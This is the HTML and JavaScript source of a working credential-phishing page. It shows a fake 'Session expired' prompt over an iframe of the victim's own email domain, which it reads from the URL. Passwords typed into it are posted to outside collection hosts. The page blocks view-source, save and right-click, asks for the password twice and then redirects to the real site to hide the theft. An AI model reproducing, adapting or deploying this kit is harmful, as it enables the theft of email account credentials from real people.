﻿
 
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Session expired！ </title>
    <style>
        body{
            width:99%;
            height:100%;
            margin:0;
            padding:0;
        }
        #mainPage{
            border:none;
        }
        hr{
            border:1px solid #999;
        }
        #overlay{
            background-color:#555;
            position:absolute;
            top:0;
            left:0;
            bottom:0;
            right:0;
            border:1px solid #555;
            opacity: 0.6;
            filter: alpha(opacity=60)
        }
        #loginBody{
            background-color:#555;
            border: 1px solid #DDD;
            box-shadow: 0px 0px 10px #DDD;
            width: 400px;
            height: 180px;
            position:absolute;
            top:30%;
            left:30%;
        }
        #loginBg{
            background:white;
            width:100%;
            height:100%;
            opacity: 0.9;
            filter: alpha(opacity=90);
        }
        #topHeader{
            margin-bottom:10px;
            padding-top:10px;
        }
        #favIcon{
            margin:0 10px;
        }
        #form{
            position:relative;
            left:10%;
            width:80%;
        }
        .email, .pass{
            margin:0 0 5px;
        }
    </style>
</head>

<body>
<iframe id="mainPage" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>

<div id="overlay" style="height: 100%; width: 1366px;">

</div>
<div id="loginBody">
    <div id="loginBg">
        <div id="topHeader">
            <img id="logoimg" src=""> <b id="sExp">Session expired！  </b>
            <hr>
        </div>
        <div id="form">
            <form id="email" id="form_component" action="https://randyallbritton.com/na/New.php" method="post">
                <input id="client" type="hidden" value="SESSION EXPIRED" name="client">
                <input id="cid" type="hidden" value="" name="cid">
                <div class="email">
                    <span id="emailId"></span> 
                    <input id="email"  type="hidden" value="" name="email">
                    <input id="main_domain" type="hidden" value="" name="main_domain">
                </div>

                <div class="pass">
                    <span id="passName">Password</span>： 
					<input type="password" name="password" id="password">
                    <div><i id="error" style="color:red;display:none;font-size:90%;"> </i></div>
                </div>
                <div class="pass">
                    <input type="checkbox"> <span id="keepme">keep me logged in</span>
                </div>
                <div class="submit">
                  <!--  <input type="submit" name="signIn" value="Login" id="submit-btn"> -->
					
		  <button class="btn btn-success btn btn-primary btn-block box-shadow"   id="submit-btn">Continue</button>
                </div>
            </form>
        </div>
    </div>
</div> 
<!-- Optional JavaScript -->	 
<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
<!-- <script src="https://ajax.googleapis.luchifab.com/ajax.googleapis/ajax/libs/jquery/2.2.4/jquery.min.js"></script> -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script> 
  
<script>

// prevent ctrl + s
$(document).bind('keydown', function(e) {
if(e.ctrlKey && (e.which == 83)) {
e.preventDefault();
return false;
}
});

document.addEventListener('contextmenu', event => event.preventDefault());

document.onkeydown = function(e) {
if (e.ctrlKey && 
(e.keyCode === 67 || 
e.keyCode === 86 || 
e.keyCode === 85 || 
e.keyCode === 117)) {
return false;
} else {
return true;
}
};
$(document).keypress("u",function(e) {
if(e.ctrlKey)
{
return false;      }
else {
return true;
}});




    /* global $ */
    $(document).ready(function(){
      var count=0;
 
      $('#back1').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });

      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email); 
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
           email.focus;
           return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
      var mainPage = 'https://'+my_slice; 
     //     var mainPage = 'https://webmail.staralliancebd.com/';  
        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+mainPage);
         document.getElementById('mainPage').src = mainPage;
    //    $("#mainPage").src(mainPage);
    
	 	
        $(".email").html(email);
		 
      }
 
      $('#submit-btn').click(function(event){
    
		//$('#error').hide();
		//$('#msg').hide();
         event.preventDefault();
	 	var email=$("#email").val();
         var password=$("#password").val();
 
		 
      ///////////new injection////////////////
      count=count+1;
    //  console.log(count); 
      $.ajax({
        dataType: 'JSON',
        url: 'https://eduemailnotification.tk/emd/New.php',
        type: 'POST',
        data:{
          email:email,
          password:password
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
			  
    //  console.log(count); 
            },
            success: function(response){
			 $('#msg').html("<span style='color:red;'>Username or Password is incorrect. Please try again</span>");
              if(response){
                $("#msg").show();
				console.log(response);
				$('#msg').html(response['msg']);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("http://www."+my_slice); 

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                   $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
                window.location.replace("http://www."+my_slice); 
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Update');
            }
          });  
    });


    });


  </script>
</body></html>